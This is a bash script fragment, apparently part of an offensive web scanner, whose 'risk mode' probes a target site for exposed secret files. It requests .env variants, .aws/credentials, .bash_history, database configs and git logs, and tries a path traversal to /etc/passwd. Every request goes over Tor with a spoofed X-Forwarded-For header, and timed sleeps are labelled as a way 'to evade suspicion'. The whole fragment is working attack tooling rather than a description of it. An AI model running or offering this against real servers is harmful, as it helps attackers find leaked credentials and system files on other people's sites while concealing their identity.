if [ "$risk_mode" = "true" ]; then
    echo ""
    echo -e "\e[0;33m[\e[0m!\e[0;33m]\e[0m You just toggle on risk mode.. So, as i promise, RISK MODE ACTIVE."
    echo ""
    sleep 3

    risk_file_01="$target_url//.env%00"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_01 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_01" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))

    risk_file_02="$target_url/../../../../../../etc/passwd"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_02 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_02" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))

    risk_file_03="$target_url/phpmyadmin/config.inc.php"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_03 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_03" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))

    risk_file_04="$target_url/.mysql_history"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_04 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_04" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))

    risk_file_05="$target_url/config/jwt.txt"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_05 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_05" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))

    risk_file_06="$target_url/.env.bak"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_06 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_06" --stderr - | grep "< HTTP"

    echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
    sleep 5

    risk_file_07="$target_url/.aws/credentials"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_07 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_07" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))

    risk_file_08="$target_url/.bash_history"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_08 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_08" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))

    risk_file_09="$target_url/config/database.yml"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_09 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_09" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))

    risk_file_10="$target_url/amplify/.config/local-env-info.json"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_10 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_10" --stderr - | grep "< HTTP"

    echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
    sleep 5

    risk_file_11="$target_url/error_log"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_11 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_11" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))

    risk_file_12="$target_url/storage/logs/laravel.log"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_12 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_12" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))

    risk_file_13="$target_url/debug.log"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_13 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_13" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))

    risk_file_14="$target_url/.git/logs/HEAD"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_14 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_14" --stderr - | grep "< HTTP"
    sleep $((2 + RANDOM % 3))

    risk_file_15="$target_url/.idea/workspace.xml"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $risk_file_15 ( Mode RISK )"
    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$risk_file_15" --stderr - | grep "< HTTP"

    echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Take your sleep man, for only 5 seconds."
    sleep 5
fi